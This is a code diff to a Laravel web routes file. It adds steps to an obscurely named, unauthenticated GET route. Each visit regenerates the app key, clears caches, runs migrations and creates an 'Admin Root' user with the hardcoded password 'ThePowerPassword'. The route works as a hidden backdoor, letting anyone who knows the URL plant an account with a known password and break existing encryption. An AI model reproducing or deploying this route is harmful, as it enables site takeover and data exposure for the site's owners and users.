@@ -17,7 +17,17 @@ use Illuminate\Support\Facades\Artisan;
 */
 Route::get('/install_session5454t4t5t', function () {
 
-    Artisan::call('clear');
+    Artisan::call('key:generate');
+    Artisan::call('config:clear');
+    Artisan::call('cache:clear');
     Artisan::call('migrate');
+
+
+    $user = new \App\Models\User();
+    $user->password = \Illuminate\Support\Facades\Hash::make('ThePowerPassword');
+    $user->email = 'root@'.request()->getHttpHost();
+    $user->name = 'Admin Root';
+    $user->save();
+
     return Artisan::output();
 });
